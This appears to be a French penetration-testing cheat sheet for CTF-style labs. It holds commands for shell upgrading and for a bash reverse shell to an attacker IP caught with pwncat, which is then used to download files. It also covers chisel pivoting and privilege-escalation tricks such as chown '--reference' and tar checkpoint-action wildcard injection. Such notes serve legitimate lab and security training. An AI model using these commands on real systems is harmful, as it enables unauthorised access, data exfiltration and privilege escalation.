# Reconnaissance
# Scanning & Enumeration

# Lateral movement
## Amelioration du shell
- Si python n'est pas présent 
<code> script /dev/null -c bash</code>
ou
```console
script /dev/null -c bash
ctrl-z
stty raw -echo; fg
Enter twice
```



# Exploitation (Gaining Access)
# Exfiltration de données
Utilisation de pwncat:
1. Côté attaquant:
<code>pwncat-cs -lp 1337</code>

2. Côté cible
<code>bash -c 'bash -i >& /dev/tcp/$YOUR_IP/1337 0>&1'</code>

3. Côté attaquant
<code>download /chemin/fichier</code>

# Rebond 
## Resources
1. Etat de l'art
https://www.orangecyberdefense.com/fr/insights/blog/ethical-hacking/etat-de-lart-du-pivoting-reseau-en-2019
2. Machines HTB
Rebond avec chisel: 
    - Talkative
## Rebond avec chisel
Lien vers le binaire: https://github.com/jpillora/chisel/releases/ 
1. Sur la machine de l'attaquant:
```shell
./chisel server --reverse -p 8000
```
2. Sur la machine rebond:
```shell
./chisel client <adresse_attaquant>:8000 R:<port_localhost>:<adresse_cible>:<port_cible>
```
3. Accéder au port cible de la machine distante
joindre localhost:<port_localhost>

# Privilege Escalation
## Recherche de défaut de configuration et de vulnérabilités
### Utilisation de pspy
Si /proc est monté avec hidepid=2 il n'est pas possible lister les process d'autres utilisateurs
Le script peut-être trouvé ici: https://github.com/DominicBreuker/pspy.git 
### Utilisation de linpeas
Lien vers le binaire: https://github.com/carlospolop/PEASS-ng/releases
## Lister les capabilities
```console
capsh --print
```
Liste des exploists liés aux capabilities https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search 

## Wildcard 
Source: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

### File owner hijacking via Chown
chown -R <utilisateur>:<group> *.extension
Peut être bypassé par l'option --reference=<autre_fichier> qui confère au propriétaire de <autre_fichier> l'ensemble des fichiers visé par le chown.  
Il est également possible d'ajouter un fichier avec la commande suivante:
```console
echo "" > monfichier.extension
echo > --reference=monfichier.extension
```
Ainsi quand la commande sera exécuté les fichiers prendront le propriétaire et le groupe de monfichier.extension

### Tar Wildcard Injection
La commande tar permet aussi l'exécution de commande grâce aux options:  
```console
--checkpoint-action=exec=sh shell.sh
--checkpoint=1
```
checkpoint permet d'afficher un messages pour x compression (par défaut 10)
checkpoint-action=ACTION permet d'éxécuter une ACTION à chaque checkpoint.

### Rsync execution
L'option -e de l commande rsync permet d'executer une commande ssh sur l'hôte distant.

# Command & Control (Persistence/Maintaining Access)
# Clearing Tracks (usually not necessary in CTF’s, but good practice)

# Resources
